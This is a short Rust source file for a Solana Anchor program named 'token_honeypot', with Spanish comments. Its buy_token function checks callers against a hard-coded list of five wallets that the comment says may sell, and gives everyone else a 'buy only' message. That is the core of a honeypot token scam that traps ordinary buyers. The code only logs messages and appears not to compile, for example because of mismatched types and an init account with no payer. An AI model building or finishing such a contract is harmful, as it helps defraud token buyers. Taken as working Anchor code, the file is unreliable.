use anchor_lang::prelude::*;

// Este ID lo actualizarás tras el deploy en Devnet
declare_id!("91nD6Wti1nHri7GhGGTjLGvAuK1QS8dBboP5NPUkLDbx");

#[program]
pub mod token_honeypot {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        msg!("Programa inicializado correctamente.");
        Ok(())
    }

    pub fn buy_token(ctx: Context<BuyToken>, amount: u64) -> Result<()> {
        let user_wallet = &ctx.accounts.user_wallet;

        // Lista de wallets permitidas para vender
        let allowed_wallets: [&Pubkey; 5] = [
            &"G13e8Lwfuwq9gKkEpNxreB8x29Kt73MW7chMiEyZnDTL".parse().unwrap(),
            &"8rbpyeFMKPfssqii4TeKutrEchhXmhvpopTdvFD2nXyD".parse().unwrap(),
            &"31sykmWaXn7ez7mWUr8BYrAoYu8exTgTPJchVEaSkPk7".parse().unwrap(),
            &"A94BYnYWzUjuvuo4mvHr18AiLcpZDGocx8qeyJJBuczD".parse().unwrap(),
            &"VYA5aarFGn3DZz4YHySDKG2BGCffn85xm9bLDs591BH".parse().unwrap(),
        ];

        if allowed_wallets.contains(&user_wallet.key()) {
            msg!("Transacción exitosa para comprar y vender token");
        } else {
            msg!("Transacción exitosa para comprar token");
        }

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(init)]
    pub user_wallet: AccountInfo<'info>,
}

#[derive(Accounts)]
pub struct BuyToken<'info> {
    pub user_wallet: Signer<'info>,
}

